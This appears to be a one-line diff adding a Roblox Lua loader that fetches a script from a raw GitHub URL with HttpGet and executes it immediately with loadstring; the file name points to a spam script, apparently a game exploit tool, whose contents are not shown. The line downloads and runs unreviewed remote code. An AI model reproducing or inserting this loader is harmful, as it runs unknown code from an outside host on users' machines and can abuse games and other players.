@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BudgieRectifier/loaders/main/loaders/cure-violence-district-spam4-311a83oohc8xad.lua"))()
